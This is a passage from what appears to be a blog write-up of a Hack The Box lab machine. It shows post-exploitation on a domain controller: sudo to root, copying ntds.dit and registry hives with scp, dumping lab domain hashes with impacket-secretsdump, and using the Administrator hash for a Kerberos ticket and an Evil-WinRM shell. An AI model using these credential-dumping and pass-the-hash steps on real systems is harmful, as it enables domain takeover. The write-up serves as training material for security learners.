+uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f78069a2e6d64438bebf96" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f7801eb0dae603c9159fcf" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f7800194f3de2463679ce7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f7800194f3de2463679ce7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">svc_backup</code></span><span class="SemanticString">:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f780968096eb167f5d7aad" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780968096eb167f5d7aad"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Sudo Rights:</span></span></h3><pre id="https://www.notion.so/24e0b98a88f78076b082e8eadf6db5ea" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>svc_backup@DC:~$</span></mark></span><span class="SemanticString"><span> sudo -l
+
+Matching Defaults entries for svc_backup on DC:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User svc_backup may run the following commands on DC:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>svc_backup@DC:~$</span></mark></span><span class="SemanticString"><span> sudo -i
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@DC:~#</span></mark></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f78020aeafd8a5333f1b93" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user is effectively root.</span></span></p></div><h3 id="https://www.notion.so/24e0b98a88f780a59aa5fbfee18a4e65" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780a59aa5fbfee18a4e65"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Backup Folder:</span></span></h3><div id="https://www.notion.so/29e0b98a88f7809aa474c9b72719df2c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The C drive is also mounted onto WSL, and the previously inaccessible Backups folder can now be read:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f78004a58ef939d3f53760" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@DC:/mnt/c/it/Third-Line Support/backups#</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 0
+drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  .
+dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025  ..
+drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 &#x27;Active Directory&#x27;
+drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  registry</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780339690e010fe75dc16" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">There’s two folders. Active Directory contains </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7804cb0bdd43e6ca15402" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@DC:/mnt/c/it/Third-Line Support/backups#</span></mark></span><span class="SemanticString"><span> ls -la &#x27;Active Directory&#x27;/
+
+total 24592
+drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
+drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
+-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit
+-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780f7898cf4ad3deeb678" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And the registry folder contains what looks like the system hive:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7800ea6b1d3547e35006e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@DC:/mnt/c/it/Third-Line Support/backups/registry#</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 17952
+drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .
+drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..
+-rwxrwxrwx 1 svc_backup svc_backup    32768 Jan 30  2025 SECURITY
+-rwxrwxrwx 1 svc_backup svc_backup 18350080 Jan 30  2025 SYSTEM</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f7807c806de0fbce5e9fbc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">scp</code></span><span class="SemanticString"> to download them.</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f780a79371d94ae9dfa62f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> scp -P 2222 -i id_rsa &#x27;svc_backup@voleur.htb:/mnt/c/it/Third-Line Support/backups/Active Directory/ntds.dit&#x27; ntds.dit
+
+Warning: Permanently added &#x27;[voleur.htb]:2222&#x27; (ED25519) to the list of known hosts.
+ntds.dit                                               100%   24MB   1.9MB/s   00:12
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> scp -P 2222 -i id_rsa &#x27;svc_backup@voleur.htb:/mnt/c/it/Third-Line Support/backups/registry/SYSTEM&#x27; system
+
+Warning: Permanently added &#x27;[voleur.htb]:2222&#x27; (ED25519) to the list of known hosts.
+SYSTEM                                                  100%   18MB   2.3MB/s   00:07</span></span></span></code></pre><div id="https://www.notion.so/29e0b98a88f780a1b778dbcf5d273a2c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f780d38561c975eefb2c8f" class="Divider"></div><h2 id="https://www.notion.so/24e0b98a88f780e0b13fc96f2b894b0d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--2"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780e0b13fc96f2b894b0d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Privilege Escalation:</span></span></h2><h3 id="https://www.notion.so/24e0b98a88f78044bb80f158aaf5369e" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f78044bb80f158aaf5369e"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Hash Dump:</span></span></h3><div id="https://www.notion.so/29e0b98a88f78082923df85ac5ac7e99" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString"> is Active Directory’s database file. It contains all the important things for the domain, including the hashes for all domain users. Similar to what I’ve done in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://ch3ng625.github.io/cicada">Cicada</a></span><span class="SemanticString">, I’ll use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">impacket-secretsdump</code></span><span class="SemanticString"> to extract the hashes. The system hive is also needed here, as it contains the boot key that’s used for decrypting </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ntds.dit</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f7803cae5bc83bfb5bec8b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-secretsdump -ntds ntds.dit -system system local
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
+[*] Reading and decrypting hashes from ntds.dit 
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::</span></mark></span><span class="SemanticString"><span>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
+voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
+voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
+voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
+voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
+voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
+voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
+voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
+[*] Kerberos keys from ntds.dit 
+Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
+Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
+..SNIP..
+[*] Cleaning up... </span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f7800390f1d76566260195" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the hash, I’ll obtain a TGT for Administrator and get a shell via WinRM:</span></span></p></div><pre id="https://www.notion.so/24e0b98a88f78061b9c2fa6222fd00a5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> impacket-getTGT -dc-ip 10.129.10.190 -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 &#x27;voleur.htb/administrator&#x27;
+
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in administrator.ccache
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/voleur]
+└─$</span></mark></span><span class="SemanticString"><span> KRB5CCNAME=administrator.ccache evil-winrm -r voleur.htb -i dc.voleur.htb
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami
+
+voleur\administrator</span></span></span></code></pre><h3 id="https://www.notion.so/24e0b98a88f780ecb29ce6eb3a6de397" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/24e0b98a88f780ecb29ce6eb3a6de397"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Root Flag:</span></span></h3><pre id="https://www.notion.so/24e0b98a88f7802fae57fd1d6ca36426" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span></mark></span><span class="SemanticString"><span> type root.txt
+
+1adcec0b************************</span></span></span></code></pre><div id="https://www.notion.so/24e0b98a88f7805aa9efee2e41ef5a83" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/24e0b98a88f781b8b1e7caa806398c37" class="Divider"></div><div id="https://www.notion.so/24e0b98a88f781d8a1ccffc06cd99028" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
+  <footer class="Footer">
+  <div>&copy; C:\Users\ch3ng &gt;_ 2025</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+
+</body>
+
+</html>
